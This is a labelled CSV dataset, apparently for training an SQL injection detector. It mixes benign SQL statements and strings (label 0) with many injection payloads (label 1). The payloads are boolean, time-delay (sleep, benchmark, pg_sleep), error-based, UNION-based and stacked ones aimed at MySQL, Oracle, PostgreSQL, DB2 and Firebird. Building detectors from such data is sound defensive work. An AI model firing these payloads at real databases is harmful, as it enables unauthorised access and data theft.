Query,Label
"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""urgd""  =  ""urgd",1
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1
45183,0
"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_2_link' LIMIT 1,0
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1
SELECT joy ( s )  FROM belt SELECT surrounded FROM driving,0
26707809w,0
"   SELECT wrote, none, frequentlyFROM settle WHERE against  IS NOT NULL",0
DELETE FROM camp,0
lotera,0
"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",1
" SELECT column_name ( s )  FROM pour,break",0
sant aniol de finestres,0
SELECT AVG ( task ) FROM medicine SELECT SUM ( shut ) ,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'fuyl'  =  'fuyl",1
SELECT CHARACTER_LENGTH ( CustomerName )  AS LengthOfName FROM Customers;,0
SELECT * FROM stuck WHERE related = 'serious'  AND City = 'former',0
SELECT automobile ( s )  FROM while LEFT JOIN,0
SELECT * FROM sheep,0
1' and   (  5116  =  1602  )  *1602,1
SELECT * FROM  ( SELECT development FROM traffic ) ,0
"  SELECT Orders.boyrID, Employees.knowledge, Employees.visit FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.signalID ORDER BY Orders.barkID",0
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,1
SELECT machine FROM pay UNION ALL SELECT mixture FROM ship ORDER BY fifty,0
63482988k,0
1   )    )    as qsos where 2721  =  2721 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
SELECT * FROM cap WHERE shape BETWEEN lie09/01/1996blanket AND farmer15/31/1996position,0
45110,0
1'+  (  select wpbj where 1849  =  1849,1
SELECT * FROM fewer WHERE care IN  ( SELECT thank FROM were ) ,0
SELECT * FROM making WHERE him  BETWEEN 10 AND 20,0
SELECT * FROM tin FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM lunch,0
s,1
1364,0
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",1
revill5,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna",1
"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",1
"1""  )   as fgne where 7207  =  7207",1
SELECT * FROM dirty WHERE whole = 'stood' FETCH FIRST 3 ROWS ONLY,0
SELECT week ( s )  FROM outside SELECT pot FROM during,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",1
SELECT DISTINCT wire FROM impossible,0
"el reyezuelo, 15",0
"  SELECT * FROM skin WHERE make NOT IN  ( 'correctly', 'ring', 'invented' )  ",0
SELECT * FROM jack,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  """,1
SELECT * FROM future FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM method WHERE thought NOT LIKE '[police]%',0
x' or full_name like '%bob%,1
"  SELECT * FROM here WHERE seven NOT IN  ( 'mine', 'origin', 'future' )  ",0
plinto,0
1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
8.01225E+15,0
1.52494E+15,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82fbdbb25' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
a06b6,0
3245,0
1' in boolean mode  )   and 5981  =  6700,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367808 )  ORDER BY meta_id ASC",0
cruz iparraguirre,0
SELECT * FROM molecular WHERE porch NOT LIKE 'local%',0
SELECT COUNT ( respectID ) FROM pressure,0
1  )   as nbno where 9816  =  9816 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT DISTINCT fuel FROM substance,0
"-3963"" or 1224  =  5119",1
"1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
SELECT COUNT ( vowel )  FROM thrown,0
"-5700 where 4238  =  4238 union all select 4238,4238,4238#",1
SELECT * FROM foreign WHERE Price NOT BETWEEN 10 AND 20,0
"-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",1
medel pujolriu,0
termmetro,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",1
"1%""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1
8.99091E+15,0
amedee@spainbb.cc,0
afiligr*anado,0
SELECT * FROM studied FETCH FIRST 50 PERCENT ROWS ONLY,0
79274775p,0
46593,0
SELECT COUNT ( chargeID ) FROM sheet,0
"1""  )   union all select null,null,null,null,null,null#",1
47609,0
"pl. comercial 54, 5d",0
SELECT * FROM mill,0
"1'+  (  select blbd where 7451  =  7451 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual-- vykx",1
select pg_sleep  (  5  )  --,1
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",1
5.79616E+15,0
SELECT * FROM fat WHERE lower = 'hang'  OR drew = 'purple',0
SELECT * FROM flew WHERE flame NOT LIKE 'of%',0
SELECT * FROM eventually WHERE evidence LIKE '%highway%',0
castellanos de moriscos,0
pettingill@demasiado.com.bv,0
SELECT sea ( s )  FROM unusual,0
"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
1  )   and sleep  (  5  ) ,1
FROM  ( SELECT DISTINCT serious FROM involved ) ,0
"   SELECT underline,in,whispered,eight,brave     (  (  command JOIN rise ON jar.bank =  strong.heavy )   INNER JOIN oceanON Orders.crew =  frighten.chanceID ) ",0
mattes,0
SELECT * FROM satellites WHERE studied = 'but'  OR syllable = 'film',0
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs,1
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1
1'   )    )     )   and 8162  =  1687 and    (    (     (  'tdyr' like 'tdyr,1
mairena,0
"1'||  (  select 'flre' where 8250  =  8250 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1
SELECT * FROM rich,0
"1'+  (  select 'yzxc' where 5230  =  5230   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1
"  SELECT * FROM classroom WHERE simplest NOT IN  ( 'pleasant', 'stems', 'summer' )  ",0
1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',1
-4615' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1
SELECT MIN ( struggle )  AS dug FROM written,0
SELECT bring ( s )  FROM alphabet LEFT JOIN,0
SELECT * FROM also WHERE Price NOT BETWEEN 10 AND 20,0
"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"   SELECT COUNT ( exactly ) , near FROM immediately BY road",0
select case when 4488  =  5522 then 1 else null end--,1
raspar,0
SELECT * FROM mix WHERE    NOT die = 'ask',0
SELECT * FROM shadow ORDER BY present DESC,0
"   SELECT written, rays, using FROM apartment WHERE dozen  IS NULL",0
"1%"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""%""  =  """,1
ribamontn al mar,0
suchet@ciaplast.tel,0
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev",1
-3750'+  (  select alpu where 3911  =  3911 order by 1--,1
"  SELECT needed AS duck, fire AS [automobile]  FROM throughout",0
goertzen,0
"-1993%""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""%""  =  """,1
SELECT AVG ( hardly ) FROM by,0
" SELECT FIELD ( ""c"", ""a"", ""b"" ) ; ",0
1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,1
SELECT enemy ( s )  FROM beside LEFT JOIN,0
SELECT * FROM practical  WHERE every NOT LIKE '[calm]%',0
SELECT education,0
SELECT * FROM metal WHERE carry BETWEEN 'discovery' AND 'national',0
"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ekjs"" like ""ekjs",1
SELECT * FROM glass ORDER BY now DESC,0
"1' in boolean mode  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
ramblizo,0
60996626m,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  '%'  =  '",1
pallen,0
SELECT AVG ( Price ) FROM stone,0
SELECT AVG ( Price ) FROM method,0
9.51518E+15,0
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'xfmq'  =  'xfmq",1
5.22E+15,0
"-8612""  )   or 4043  =  3083 and   (  ""pjzo"" like ""pjzo",1
SELECT * FROM draw WHERE longer NOT LIKE '[whose]%',0
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,1
SELECT blank ( s ) FROM yard INNER JOIN,0
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,1
-8047' or 3038  =  3038,1
SELECT * FROM  ( SELECT worth FROM foreign ) ,0
1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,1
"   SELECT tribe, why, cat FROM according WHERE plan  IS NULL",0
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'xgzb'  =  'xgzb",1
"-2226%""   )    )    union all select 1018,1018,1018,1018--",1
SELECT * FROM consonant WHERE using LIKE '%book%',0
"1%'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",1
"c/ fontans, 124, 10?c",0
linton,0
SELECT fallen FROM cell UNION SELECT rock FROM actual ORDER BY everyone,0
SELECT mood ( s FROM wild RIGHT JOIN,0
"  SELECT IFNULL ( ""Hello"", ""W3Schools.com"" ) ;",0
SELECT * FROM  ( SELECT problem FROM exercise ) ,0
SELECT * FROM bread ORDER BY temperature DESC,0
"select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--",1
"cerollera, la",0
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,1
kalpak,0
" SELECT * FROM average ORDER BY sure, find",0
"1"" where 7245  =  7245 and 9198  =  9198--",1
karzau@asdn.edu,0
22468230j,0
SELECT * FROM gate FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" union all select null,null,null,null--",1
SELECT * FROM rule WHERE seeing BETWEEN '1996-07-01' AND '1996-07-31',0
"1'   )    )    as uvxv where 6663  =  6663 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT COUNT (  column_name  )  FROM table_name WHERE condition ;,0
"-2898"" where 3301  =  3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",1
"INSERT INTO automobile ( cry, strange, cost, though, wise, original )  VALUES  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",0
hallaran@manjarr.cd,0
"1  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
graciot ballv,0
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
"1%'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  '%'  =  '",1
"-1874""  )   as wgpj where 6481  =  6481 or 3629  =  3459",1
"INSERT INTO weight  ( remain, select, distant )  VALUES  ( 'shut', 'create', 'tribe' )  ",0
"1""  )   as kzuq where 4259  =  4259",1
"1%"" union all select null#",1
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
rinaldi albiol,0
SELECT * FROM roof FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart,0
"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",1
SELECT * FROM flat 3,0
SELECT * FROM writer WHERE Price NOT BETWEEN 10 AND 20,0
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1
SELECT TOP 50 PERCENT * FROM couple SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM instance,0
SELECT AVG ( customs ) FROM sit SELECT SUM ( red ) ,0
"1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127",1
*',1
shue-sampson@artroscopiagc.mn,0
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""fvtu"" like ""fvtu",1
rebengivc@somosagelespaa.ie,0
71196230y,0
SELECT AVG ( pilot ) FROM larger,0
SELECT * FROM bring FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM again,0
SELECT * FROM  ( SELECT announced FROM knew ) ,0
"1' union all select null,null,null,null,null,null,null,null--",1
kokoska1,0
" select * from users where id  =  1 union select !<@,version  (    )   -- 1",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262310,262326,262328 )  ORDER BY meta_id ASC",0
silcula,0
"-4915' union all select 1928,1928,1928,1928#",1
if  (  5127  =  2829  )   select 5127 else drop function okos--,1
"1""  )   as rcnk where 1800  =  1800",1
"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",1
"1'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
61089913g,0
SELECT * FROM wp_houzez_fields_builder order by id ASC,0
"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
milton@diagnosticoradiologico.asia,0
SELECT * FROM should WHERE rear = 'divide',0
"  SELECT * FROM went WHERE musical NOT IN  ( 'jack', 'settle', 'eaten' )  ",0
SELECT * FROM dozen FETCH FIRST 3 ROWS ONLY,0
1'   )    )    as gfzb where 7904  =  7904,1
"   SELECT rubber, difficulty, teethFROM dried WHERE magic  IS NOT NULL",0
"1""   )    )    as ccjk where 1932  =  1932 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1""  )   as uuth where 8555  =  8555 union all select null,null#",1
"-6118 union all select 5906,5906,5906,5906,5906#",1
